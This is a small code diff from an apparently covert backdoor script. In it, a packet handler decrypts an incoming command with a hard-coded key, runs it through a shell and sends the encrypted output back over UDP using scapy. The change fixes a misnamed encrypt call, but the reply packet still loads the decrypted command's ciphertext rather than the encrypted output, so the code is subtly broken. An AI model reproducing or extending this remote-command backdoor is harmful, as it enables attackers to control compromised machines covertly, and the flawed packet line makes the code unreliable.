@@ -39,7 +39,7 @@ def runCommand(packet):
   data = triplesec.decrypt(encryptedData, b'key yo')
   print "Running command " + data
   output = subprocess.check_output(data, shell=True, stderr=subprocess.STDOUT)
-  encryptedOutput = triplesec.encryptedData(output, b'key yo')
+  encryptedOutput = triplesec.encrypt(output, b'key yo')
   packet = IP(packet[0][1].src)/UDP(dport=int(args.sourcePort), sport=int(args.destPort))/Raw(load=encryptedData)
   send(packet)
 
